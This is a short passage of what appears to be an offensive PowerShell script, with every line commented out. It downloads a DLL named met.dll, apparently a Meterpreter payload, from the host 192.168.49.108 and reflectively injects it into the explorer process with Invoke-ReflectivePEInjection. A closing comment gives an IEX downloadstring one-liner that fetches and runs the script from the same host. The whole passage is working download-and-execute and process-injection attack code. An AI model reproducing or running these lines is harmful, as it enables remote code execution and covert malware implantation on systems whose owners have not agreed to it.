...
#$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.108/met.dll')
#$procid = (Get-Process -Name explorer).Id
#Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

#run with IEX (New-Object Net.Webclient).downloadstring("http://192.168.49.108/inject.ps1") or whatever this script is hosted as
